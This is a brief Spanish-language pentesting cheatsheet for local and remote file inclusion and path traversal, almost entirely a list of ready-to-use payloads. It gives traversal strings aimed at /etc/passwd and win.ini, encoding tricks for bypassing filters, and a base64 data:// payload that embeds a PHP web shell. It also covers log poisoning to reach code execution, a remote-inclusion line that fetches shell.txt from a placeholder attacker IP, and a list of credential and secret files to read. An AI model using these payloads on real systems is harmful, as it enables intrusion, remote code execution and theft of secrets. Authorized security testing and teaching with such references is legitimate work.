# Cheatsheet · File Inclusion / Path Traversal

Explicación en `../../01-web/injection/lfi-rfi.md` y `../../01-web/access-control/path-traversal.md`. **Solo sobre objetivos autorizados.**

## Traversal básico

```
../../../../etc/passwd
..\..\..\..\windows\win.ini
/etc/passwd
```

## Bypass de filtros

```
%2e%2e%2f%2e%2e%2f            # ../../ URL-encoded
..%252f..%252f                # doble codificación
....//....//                  # filtro que elimina ../ una vez
../../../etc/passwd%00        # null byte (legacy)
```

## LFI a lectura de código (PHP wrappers)

```
php://filter/convert.base64-encode/resource=config.php
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+
```

## LFI a RCE

```
# log poisoning: inyecta PHP en User-Agent y luego incluye el log
../../../../var/log/apache2/access.log
# incluir fichero subido
```

## RFI

```
?page=http://TU-IP/shell.txt
```

## Ficheros interesantes

```
/etc/passwd  /etc/shadow  /etc/hosts  /proc/self/environ
C:\Windows\System32\drivers\etc\hosts   web.config   .env
```
